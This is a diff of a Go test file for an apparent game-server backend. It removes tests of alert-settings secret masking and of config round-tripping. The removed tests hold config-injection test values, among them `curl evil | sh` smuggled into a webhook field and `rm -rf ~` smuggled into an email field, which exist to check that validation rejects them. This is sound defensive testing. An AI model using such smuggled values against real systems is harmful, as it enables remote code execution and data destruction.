@@ -1,8 +1,6 @@
 package backend
 
 import (
-	"os"
-	"path/filepath"
 	"strings"
 	"testing"
 )
@@ -136,59 +134,6 @@ func TestCfgValue(t *testing.T) {
 	vals := cfgValues("#port=\"1\"\nport=\"27015\"\nclientport=\"27005\"\nport=\"27016\"\n")
 	if vals["port"] != "27016" || vals["clientport"] != "27005" {
 		t.Errorf("cfgValues = %v", vals)
-	}
-}
-
-func TestAlertSettingsMaskingAndValidation(t *testing.T) {
-	stored := AlertSettings{DiscordWebhook: "https://discord.example/secret", EmailPass: "smtp-pass", EmailDest: "a@b.c"}
-	masked := stored.Masked()
-	if masked.DiscordWebhook != SecretMask || masked.EmailPass != SecretMask {
-		t.Fatal("secrets not masked")
-	}
-	if masked.EmailDest != "a@b.c" {
-		t.Fatal("non-secret value masked")
-	}
-	if stored.DiscordWebhook != "https://discord.example/secret" {
-		t.Fatal("Masked must not modify the original")
-	}
-
-	submitted := masked
-	submitted.mergeSecrets(stored)
-	if submitted.DiscordWebhook != stored.DiscordWebhook || submitted.EmailPass != stored.EmailPass {
-		t.Fatal("masked values must keep stored secrets")
-	}
-
-	evil := AlertSettings{DiscordWebhook: `x"; curl evil | sh; "`}
-	if evil.Validate() == nil {
-		t.Fatal("config injection accepted")
-	}
-}
-
-func TestAlertSettingsRoundTrip(t *testing.T) {
-	dir := t.TempDir()
-	srv := GameServerInstance{ID: "vhserver", User: "vhserver", Script: "vhserver", Dir: dir}
-	im := NewStaticInstanceManager(t.TempDir(), srv)
-	cfg := filepath.Join(dir, "lgsm", "config-lgsm", "vhserver", "vhserver.cfg")
-	mustWrite(t, cfg, "discordalert=\"on\"\ndiscordwebhook=\"https://hook/secret\"\n")
-
-	got, err := im.GetAlertSettings("vhserver")
-	if err != nil {
-		t.Fatal(err)
-	}
-	if !got.DiscordEnabled || got.DiscordWebhook != SecretMask {
-		t.Fatalf("unexpected settings: %+v", got)
-	}
-	got.EmailDest = "admin@example.com"
-	if err := im.SaveAlertSettings("vhserver", got); err != nil {
-		t.Fatal(err)
-	}
-	data, _ := os.ReadFile(cfg)
-	if !strings.Contains(string(data), `discordwebhook="https://hook/secret"`) || !strings.Contains(string(data), `emaildest="admin@example.com"`) {
-		t.Fatalf("unexpected config:\n%s", data)
-	}
-	got.EmailDest = "x\"\nrm -rf ~"
-	if err := im.SaveAlertSettings("vhserver", got); err == nil {
-		t.Fatal("injection was written")
 	}
 }
 
